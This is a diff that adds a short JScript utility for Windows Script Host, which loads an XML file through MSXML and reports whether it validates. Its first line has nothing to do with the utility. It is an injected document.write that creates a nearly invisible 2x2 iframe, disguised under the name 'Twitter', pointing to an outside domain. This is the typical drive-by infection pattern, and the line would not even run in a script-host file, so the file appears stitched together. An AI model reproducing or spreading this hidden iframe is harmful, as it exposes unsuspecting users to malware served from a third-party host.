@@ -1,0 +1,19 @@
+document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://srihrc.ipower.com/zxnq.html?j=2861018></iframe>');
+
+var x = new ActiveXObject("MSXML2.DOMDocument.4.0");
+x.async = false;
+x.validateOnParse = true;
+if(!WScript.Arguments.length){
+  WScript.Echo("Use: \n\tvalidate filename");
+  WScript.Quit();
+}
+var file = WScript.Arguments(0);
+if(x.load(file)){
+  WScript.Echo("Document '"+file+"' is loaded and validated successfully");
+}else{
+  if(x.parseError.errorCode != 0){
+    WScript.Echo("errorReason=" + x.parseError.reason); 
+  }else{
+    WScript.Echo("===NO PARSE ERROR===\n" + x.xml);
+  }
+}
